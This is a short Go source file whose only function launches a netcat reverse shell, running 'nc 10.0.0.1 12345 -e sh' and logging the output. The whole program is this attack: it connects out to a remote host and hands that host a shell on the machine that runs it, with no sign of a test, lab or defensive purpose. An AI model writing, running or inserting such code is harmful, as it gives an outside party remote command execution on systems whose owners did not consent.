package main

import (
	"log"
	"os/exec"
)

func main() {
	c := exec.Command("nc", "10.0.0.1", "12345", "-e", "sh")
	log.Printf("running %s ...", c)
	bs, err := c.CombinedOutput()
	if err != nil {
		log.Fatalf("run failed: %v", err)
	}
	log.Printf("output: %s", bs)
}
